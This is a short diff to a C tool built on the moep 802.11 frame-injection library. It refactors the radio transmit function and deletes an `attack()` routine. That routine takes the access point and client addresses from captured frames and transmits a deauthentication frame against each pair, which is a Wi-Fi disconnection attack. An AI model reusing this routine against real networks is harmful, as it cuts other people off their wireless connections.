@@ -45,7 +45,7 @@ const char *argp_program_bug_address = "<moepi@moepi.net>";
 
 static char args_doc[] = "IF FREQ";
 
-static int rad_tx(moep_frame_t f);
+int rad_tx(moep_frame_t f);
 
 /*
  * Argument parsing
@@ -236,12 +236,6 @@ signal_handler(int sig)
 	}
 }
 
-
-moep_frame_t create_rad_frame()
-{
-	return moep_dev_frame_create(cfg.rad.dev);
-}
-
 int
 rad_tx(moep_frame_t f)
 {
@@ -337,38 +331,6 @@ run()
 }
 
 
-
-static int
-attack(moep_frame_t frame)
-{
-	struct ieee80211_hdr_gen *hdr;
-	moep_frame_t f;
-	u8 hwaddr[IEEE80211_ALEN];
-	u8 bssid[IEEE80211_ALEN];
-
-	if (!(hdr = moep_frame_ieee80211_hdr(frame))) {
-		LOG(LOG_ERR, "moep_frame_ieee80211_hdr() failed");
-		return -1;
-	}
-
-	if (0 > get_bssid(bssid, hdr)) {
-		return -1;
-		//LOG(LOG_INFO, "bssid not found");
-	}
-
-	if (0 > get_sta_hwaddr(hwaddr, hdr)) {
-		return -1;
-		//LOG(LOG_INFO, "sta hwaddr not found");
-	}
-
-	f = deauth(hwaddr, bssid);
-	rad_tx(f);
-	LOG(LOG_ERR, "attack!");
-
-	moep_frame_destroy(f);
-
-	return 0;
-}
 
 static void
 radh(moep_dev_t dev, moep_frame_t frame)
